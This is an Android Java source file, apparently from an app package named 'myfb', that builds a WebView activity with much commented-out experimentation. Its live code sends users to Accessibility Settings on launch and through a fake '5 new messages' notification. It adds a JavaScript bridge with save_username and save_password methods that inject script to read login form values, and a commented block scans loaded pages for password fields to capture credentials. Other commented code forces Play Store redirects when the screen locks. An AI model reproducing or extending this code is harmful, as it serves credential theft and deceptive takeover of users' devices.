package com.api.utils.web;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.DownloadListener;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;
import android.widget.Toast;

import com.api.utils.myfb.R;
import com.applovin.sdk.AppLovinSdk;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Random;


/**
 * Created by fj on 2018/10/22.
 */

public class WebActivity extends Activity {

    private WebView webView;
    private PowerManager.WakeLock wakeLock;
    private Random _rand = new Random();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity);
//        setContentView(R.layout.activity);
//        final String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
        /*webView = new WebView(this);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.e("sdk", "==shouldOverrideUrlLoading");
                webView.loadUrl(url);
                return super.shouldOverrideUrlLoading(view, url);
            }

            *//*@Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                Log.e("sdk", "==shouldOverrideUrlLoading");
                webView.loadUrl(adsenseBannerUrl);
                return super.shouldOverrideUrlLoading(view, request);
            }*//*

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.e("sdk", "==onPageStarted");
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.e("sdk", "==onPageStarted");
            }

            @Override
            public void onReceivedError(WebView view, WebResourceRequest request, WebResourceError error) {
                super.onReceivedError(view, request, error);
                Log.e("sdk", "==onReceivedError");
            }
        });
        webView.setDownloadListener(new DownloadListener() {
            @Override
            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) {
                Log.e("sdk", "==onDownloadStart");
                Uri uri = Uri.parse(url);
                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                startActivity(intent);
            }
        });
        webView.loadUrl(adsenseBannerUrl);
//        setContentView(webView);


        WindowManager manager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(WindowManager.LayoutParams.TYPE_TOAST,WindowManager.LayoutParams.WRAP_CONTENT,WindowManager.LayoutParams.WRAP_CONTENT);

        params.format=1;
//        params.flags=40;
        params.flags=WindowManager.LayoutParams.FLAG_FULLSCREEN;
//                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
//                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
//        params.x = 0;//窗口位置的偏移量
//        params.y = 0;

        TextView textView = new TextView(this);
        textView.setText("aaaaaaaaaaaa");
        textView.setTextColor(Color.RED);
        manager.addView(webView, params);*/


//        Intent intent2 = new Intent(Intent.ACTION_VIEW);
//        intent2.setData(Uri.parse(adsenseBannerUrl));
//        intent2.setPackage("com.android.vending");
//        this.startActivity(intent2);

        /*IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        this.registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String action = intent.getAction();
                if (Intent.ACTION_SCREEN_ON.equals(action)) { // 开屏
                    Log.e("sdk", "==ACTION_SCREEN_ON");
                    backToHome(WebActivity.this);
                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) { // 锁屏
                    Log.e("sdk", "==ACTION_SCREEN_OFF");
//        Intent intent2 = new Intent(Intent.ACTION_VIEW);
//        intent2.setData(Uri.parse(adsenseBannerUrl));
//        intent2.setPackage("com.android.vending");
//        this.startActivity(intent2);
                    String adsenseBannerUrl = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
                    String id = Uri.parse(adsenseBannerUrl).getQueryParameter("id");
                    Log.e("sdk","id -"+ id);

                    try {
                        WebActivity.this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    } catch (Exception anfe) {
                        Log.e("sdk","Exception -"+anfe.getMessage());
                        WebActivity.this.getApplicationContext().startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + id)).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                    }


                } else if (Intent.ACTION_USER_PRESENT.equals(action)) { // 解锁
                    Log.e("sdk", "==ACTION_USER_PRESENT");
                    if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        Log.e("sdk", "==ACTION_USER_PRESENT "+android.os.Build.VERSION.SDK_INT);


                    }
                }
            }
        }, filter);*/

        /*IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
        filter.addDataScheme("package");

        getApplicationContext().registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {

                String pkg = intent.getData().getSchemeSpecificPart();
                Log.e("sdk", "==onReceive  "+pkg);
            }
        }, filter);*/

//        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
//        if (pm == null) {
//           return;
//        }
//        pm.goToSleep(SystemClock.uptimeMillis());
//        pm.gotoSleep();
//        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "TAG");  wakeLock.acquire();
//        wakeLock.release();


       /* PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "TAG");
        wakeLock.acquire();
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable(){
            public void run(){
                Log.e("sdk", "==postDelayed  ");
                wakeLock.release();
            }
        }, 10*1000);*/

//        showWeb();
        int delay = (3 + _rand.nextInt(2)) * 1000;

        Log.e("sdk", "==postDelayed  "+delay);

        Intent intent=new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);

//        setNotification();
//        String info = getStringText();
//        final String info = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
//        Log.e("sdk", "==info  "+info);
//        Toast.makeText(this,""+info,Toast.LENGTH_LONG).show();


    }

    private void setNotification() {
        NotificationManager mNotifacationManager;
        mNotifacationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

       /* NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(this);

        mBuilder.setContentTitle("测试标题")//设置通知栏标题
                .setContentText("测试内容")//设置通知栏显示内容
                .setTicker("测试通知来啦")//设置通知在第一次到达时在状态栏中显示的文本
                .setWhen(System.currentTimeMillis())//通知产生的时间，会在通知栏信息里显示，一般是系统获取到的时间
                .setPriority(Notification.PRIORITY_DEFAULT)//设置通知优先级
                .setNumber(10)//设置通知集合的数量
                .setAutoCancel(true)//当用户点击面板就可以让通知自动取消
                .setOngoing(false)//true,设置它为一个正在进行的通知，通常表示一个后台任务，用户积极参与（如播放音乐）或以某种方式正在等待，因此占用设备（如一个文件下载，同步操作，主动网络连接）。
                .setDefaults(Notification.DEFAULT_VIBRATE)//向通知添加声音、闪灯和振动效果的最简单、最一致的方式是使用当前的用户默认设置，使用defaults属性，可以组合Notification.DEFAULT_ALL、 Notification.DEFAULT_SOUND添加声音
                .setSmallIcon(R.mipmap.ic_launcher)//设置通知小Icon
                .setCategory(Notification.CATEGORY_MESSAGE)//设置通知类别
                .setColor(0x0000ff)//设置通知栏颜色
                .setContentInfo("大文本")//在通知的右侧设置大文本
                .setLocalOnly(true)//设置此通知是否仅与当前设备相关。如果设置为true，通知就不能桥接到其他设备上进行远程显示。
                .setVibrate(new long[]{0, 300, 500, 700})//设置使用振动模式
                .setUsesChronometer(true)//设置是否显示时间计时，电话通知就会使用到
                .setRemoteInputHistory(new CharSequence[]{"1", "2", "3"})//设置远程输入历史
                .setOnlyAlertOnce(true);//设置仅提醒一次。*/

       /* NotificationManager manager;
        int notification_id = 0;
        manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        Notification.Builder builder = new Notification.Builder(this);
        builder.setSmallIcon(R.drawable.ic_launcher);
        builder.setTicker("World");
        builder.setWhen(System.currentTimeMillis());
        builder.setContentTitle("标题栏");
        builder.setContentText("这个是显示出来的内容部分");
        Intent intent = new Intent(this, Activity.class);
        PendingIntent ma = PendingIntent.getActivity(this, 0, intent, 0);
        builder.setContentIntent(ma);//设置点击过后跳转的activity
//        builder.setDefaults(Notification.DEFAULT_SOUND);//设置声音
//        builder.setDefaults(Notification.DEFAULT_LIGHTS);//设置指示灯
//        builder.setDefaults(Notification.DEFAULT_VIBRATE);//设置震动
//        builder.setDefaults(Notification.DEFAULT_ALL);//设置全部
        Notification notification = builder.build();//4.1以上用.build();
        notification.flags |= Notification.FLAG_AUTO_CANCEL;// 点击通知的时候cancel掉
        manager.notify(notification_id,notification);*/

        String id = "my_channel_01";
        String name="我是渠道名字";
        NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        Notification notification = null;
        Intent intent=new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        PendingIntent ma = PendingIntent.getActivity(this, 0, intent, 0);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel mChannel = new NotificationChannel(id, name, NotificationManager.IMPORTANCE_LOW);
            Toast.makeText(this, mChannel.toString(), Toast.LENGTH_SHORT).show();
            Log.i("sdk", mChannel.toString());
            notificationManager.createNotificationChannel(mChannel);
            notification = new Notification.Builder(this)
                    .setChannelId(id)
                    .setContentTitle("5 new messages")
                    .setContentText("hahaha")
                    .setContentIntent(ma)
                    .setSmallIcon(R.drawable.ic_launcher).build();
        } else {
//            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
//                    .setContentTitle("5 new messages")
//                    .setContentText("hahaha")
//                    .setSmallIcon(R.mipmap.ic_launcher)
//                    .setOngoing(true)
//                    .setChannel(id);//无效
//            notification = notificationBuilder.build();
            //        startActivity(intent);
//            Intent intent = new Intent(this, Activity.class);
            notification = new Notification.Builder(this)
                    .setContentTitle("new messages")
                    .setContentText("hahaha")
                    .setSmallIcon(R.drawable.ic_launcher)
//                    .setTicker("World")
//                    .setWhen(System.currentTimeMillis())
                    .setContentIntent(ma)  //设置点击过后跳转的activity
                    .build();

//            notification.flags |= Notification.FLAG_AUTO_CANCEL;// 点击通知的时候cancel掉

        }
        notificationManager.notify(111123, notification);

    }

    private void showWeb() {

        String info = getStringText();
//        final String info = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
        Log.e("sdk", "==info  "+info);
//        String s = info.toString();
        Toast.makeText(this,""+info,Toast.LENGTH_LONG).show();
        webView = (WebView)findViewById(R.id.web);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setDefaultTextEncodingName("utf-8");
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setSupportMultipleWindows(true);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.e("sdk", "==shouldOverrideUrlLoading  "+url);
                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.e("sdk", "==onPageStarted  "+url);
            }

            @Override
            public void onLoadResource(WebView view, String url) {
                super.onLoadResource(view, url);
            }
        });
        webView.setWebChromeClient(new WebChromeClient());
//        webView.setWebViewClient(new WebViewClient(){
//            @Override
//            public boolean shouldOverrideUrlLoading(WebView view, String url) {
//                return true;// 返回false
//            }
//        });
        webView.loadUrl(info);
    }

    private void showWeb2() {

        final String info = "https://play.google.com/store/apps/details?id=com.hwgg.tcsdzz";
        Log.e("sdk", "==info  "+info);
//        String s = info.toString();
//        Toast.makeText(this,""+info,Toast.LENGTH_LONG).show();
        webView = (WebView)findViewById(R.id.web);
        webView.getSettings().setLoadsImagesAutomatically(true);
        webView.getSettings().setDefaultTextEncodingName("utf-8");
        webView.getSettings().setDomStorageEnabled(true);

        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new JavaScriptInterface(), "android");
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setSupportMultipleWindows(true);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.e("sdk", "==shouldOverrideUrlLoading  "+url);

                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.e("sdk", "==onPageStarted  "+url);
            }

            @Override
            public void onLoadResource(WebView view, String url) {
//                super.onLoadResource(view, url);
                getHtml();
                Log.e("sdk", "onLoadResource-->>" + url);
            }
        });
        webView.setWebChromeClient(new WebChromeClient());
        webView.loadUrl(info);
    }

    private String getStringText() {
        StringBuilder info = new StringBuilder("");
//        File file = new File("/mnt/sdcard/Download/11111.txt");
        File file = new File(Environment.getExternalStorageDirectory().getPath() + "/test/"+"aaa.txt");
        Log.e("sdk", "==file  "+file.exists());
        String str = null;
        try {
            InputStream is = new FileInputStream(file);
            InputStreamReader input = new InputStreamReader(is, "UTF-8");
            BufferedReader reader = new BufferedReader(input);
//            reader.read
            while ((str = reader.readLine()) != null) {
                info.append(str);
            }

        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return info.toString();
    }

    //回到桌面
    public static void backToHome(Context context) {
        Intent home=new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(home);
    }



    public class JavaScriptInterface {
        String mPasswrod;
        String mUsername;

        @JavascriptInterface
        public void getHTML(final String html) {
            if (!TextUtils.isEmpty(html)) {
//                saveWebViewUserData.saveUserDataWebView(webview, html);
                Log.e("sdk", "getHTML-->>" + html);
            }
        }

        @JavascriptInterface
        public void save_password(final String password) {


            if (!TextUtils.isEmpty(password)){
//                LogUtils.e("received from js. password = " + password);
                this.mPasswrod = password;
//                checkData(mUsername, mPasswrod);
            }


        }

        @JavascriptInterface
        public void save_username(final String username) {
            if (!TextUtils.isEmpty(username)) {
//                LogUtils.e("received from js. username = " + username);
                this.mUsername = username;
//                checkData(mUsername, mPasswrod);
            }
        }

    }

    private void getHtml() {
        webView.loadUrl("javascript:window.android.getHTML('<html>'+document.body.innerHTML+'</html>');");
    }


    /*public void saveUserDataWebView(WebView webView, String html) {
        Document document = Jsoup.parse(html);
        Elements elements = document.select("input");
        boolean isContainsPassword = false;
        for (Element element : elements) {
            String type = element.attr("type");
            if ("password".equals(type)) {
                isContainsPassword = true;
                break;
            }
        }
        if (!isContainsPassword) {
            return;
        }
        for (Element element : elements) {
            String className = element.className();
            String type = element.attr("type");
            webView.post(new Runnable() {
                @Override
                public void run() {
                    LogUtils.e("this element id is = " + element.attr("id") + " type = " + type);
                    String id = element.attr("id");
                    if (filterData(type, id)) {
                        int handType = handleType(type);
                        if (handType == NONE) {
                            handType = handleId(id);
                            if (handType == NONE) {
                                handleClassName(className);
                            }
                        }
                        switch (handType) {
                            case PASSWORD:
                                if (id==null){

                                }else {
                                    savePasswordById(id, webView);
                                }
                                break;
                            case USERNAME:
                                if (id==null){
                                }else {
                                    saveUsernameById(id, webView);
                                }
                                break;
                            case NONE:
                                break;
                        }
                    }
                }
            });
        }
    }

    private int handleClassName(String className) {
        if (className == null) {
            return ERROR;
        }
        if (className.contains("password")) {
            return PASSWORD;
        }
        if (className.contains("captcha")) {
            return ERROR;
        }
        return USERNAME;
    }


    private boolean filterData(String type, String id) {
        if ("captcha".equals(type)) {
            return false;
        } else if ("login_vcode".equals(type)) {
            return false;
        } else if ("button".equals(type)) {
            return false;
        } else if ("hidden".equals(type)) {
            return false;
        } else if ("submit".equals(type)) {
            return false;
        } else if ("checkbox".equals(type)) {
            return false;
        } else if ("captcha".equals(id)) {
            return false;
        } else if ("inp_ChkCode".equals(id)) {
            return false;
        } else {
            return true;
        }
    }

    private int handleId(String id) {
        if (id == null) {
            return NONE;
        }
        if (id.contains("captcha")) {
            return ERROR;
        }
        if (id.contains("password")) {
            return PASSWORD;
        }
        if (id.contains("Phone")) {
            return USERNAME;
        }
        if (id.contains("username")) {
            return USERNAME;
        }
        if (id.contains("code")) {
            return ERROR;
        }
        return USERNAME;
    }

    private int handleType(String type) {
        if (type == null) {
            return NONE;
        }
        if (type.contains("tel")) {
            return ERROR;
        }
        if (type.contains("pwd")) {
            return PASSWORD;
        }
        if (type.contains("password")) {
            return PASSWORD;
        }
        return NONE;
    }*/
    private void saveUsernameById(String id, WebView webView) {
        webView.loadUrl("javascript:window.android.save_username(document.getElementById('" + id + "').value)");
    }

    private void savePasswordById(String id, WebView webView) {
        webView.loadUrl("javascript:window.android.save_password(document.getElementById('" + id + "').value)");
    }
}
